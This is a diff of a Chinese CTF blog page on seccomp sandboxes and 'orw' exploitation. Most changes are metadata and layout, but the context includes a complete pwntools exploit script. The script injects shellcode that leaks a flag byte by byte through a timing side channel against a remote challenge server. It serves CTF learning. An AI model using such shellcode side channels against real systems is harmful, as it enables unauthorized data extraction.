@@ -4,12 +4,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <meta name="description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. s">
+    <meta name="description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. sec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="seccomp_orw">
 <meta property="og:url" content="http://example.com/2021/10/17/seccomp-orw/index.html">
 <meta property="og:site_name" content="z1r0's blog">
-<meta property="og:description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. s">
+<meta property="og:description" content="现在有很多pwn题中有沙箱机制。会使用类似seccomp的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。  seccompseccomp (short for secure computing mode) is a computer security facility in the Linux kernel. sec">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/1.png">
 <meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/3.png">
@@ -24,7 +24,7 @@
 <meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/14.png">
 <meta property="og:image" content="http://example.com/2021/10/17/seccomp-orw/15.png">
 <meta property="article:published_time" content="2021-10-17T00:03:25.000Z">
-<meta property="article:modified_time" content="2022-05-06T00:48:31.402Z">
+<meta property="article:modified_time" content="2023-08-17T06:33:53.182Z">
 <meta property="article:author" content="z1r0">
 <meta property="article:tag" content="sandbox">
 <meta name="twitter:card" content="summary">
@@ -57,6 +57,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
     
 	<!-- mathjax -->
 	
@@ -91,7 +93,7 @@
         <li><a class="icon" aria-label="Previous post" href="/2021/10/19/ZCTF-2015-pwn/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/2021/10/12/de1ctf-2019-weapon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Next post" href="/2021/10/09/IO-FILE-2-24%E5%AF%B9vtable%E6%A3%80%E6%B5%8B%E7%BB%95%E8%BF%87%E3%80%81house-of-orange/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
         <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
@@ -168,9 +170,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <font size="4">
-
-<blockquote>
+    <blockquote>
 <p>现在有很多pwn题中有沙箱机制。会使用类似<code>seccomp</code>的函数来禁用一部分系统调用，往往会把 execve 这种系统调用禁用掉，基本上拿不到shell。所以出现了新的利用也就是orw。</p>
 </blockquote>
 <h2 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h2><p><strong>seccomp</strong> (short for <strong>secure computing mode</strong>) is a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Computer_security">computer security</a> facility in the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Linux_kernel">Linux kernel</a>. seccomp allows a <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Process_(computing)">process</a> to make a one-way transition into a “secure” state where it cannot make any <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/System_call">system calls</a> except <code>exit()</code>, <code>sigreturn()</code>, <code>read()</code> and <code>write()</code> to already-open <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/File_descriptor">file descriptors</a>. Should it attempt any other system calls, the kernel will terminate the process with <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SIGKILL">SIGKILL</a> or <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/SIGSYS">SIGSYS</a>.[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp#cite_note-1">1]</a>[<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Seccomp#cite_note-2">2]</a> In this sense, it does not <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Virtual_machine">virtualize</a> the system’s resources but isolates the process from them entirely.</p>
@@ -256,7 +256,7 @@
 <h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level = <span class="string">'critical'</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">'./z1r0'</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    flag.append(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">'a'</span>), <span class="built_in">ord</span>(<span class="string">'z'</span>) + <span class="number">1</span>):</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line">flag.append(<span class="string">'{'</span>)</span><br><span class="line">flag.append(<span class="string">'-'</span>)</span><br><span class="line">flag.append(<span class="string">'}'</span>)</span><br><span class="line">flag.append(<span class="string">'\x00'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'[+] flag = '</span> + <span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">final = <span class="string">''</span></span><br><span class="line">xman = <span class="literal">False</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> xman:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'[+] '</span> + <span class="built_in">str</span>(index) + <span class="string">' chr'</span>)</span><br><span class="line">    <span class="keyword">for</span> test_flag <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            r = remote(<span class="string">'node4.buuoj.cn'</span>, <span class="number">26020</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = process(file_name)</span><br><span class="line">        shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">        mov rax,[rsp + 0x10]</span></span><br><span class="line"><span class="string">        mov rax,[rax + 0x18]</span></span><br><span class="line"><span class="string">        mov al,byte ptr[rax + %d]</span></span><br><span class="line"><span class="string">        cmp al,%d</span></span><br><span class="line"><span class="string">        jz $-0x2</span></span><br><span class="line"><span class="string">        '''</span> % (index, <span class="built_in">ord</span>(test_flag)))</span><br><span class="line">        r.sendlineafter(<span class="string">'Your Shellcode &gt;&gt;'</span>, shellcode)</span><br><span class="line">        start = time.time()</span><br><span class="line">        r.can_recv_raw(timeout = <span class="number">3</span>)</span><br><span class="line">        end = time.time()</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> test_flag == <span class="string">'\x00'</span>:</span><br><span class="line">                xman = <span class="literal">True</span></span><br><span class="line">            final += test_flag</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">'[+] success get '</span> + <span class="built_in">str</span>(index) + <span class="string">' chr'</span>)</span><br><span class="line">            index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">'[+] final = '</span> + final)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/2021/10/17/seccomp-orw/15.png"></p>
-</font>
+
   </div>
 </article>
 
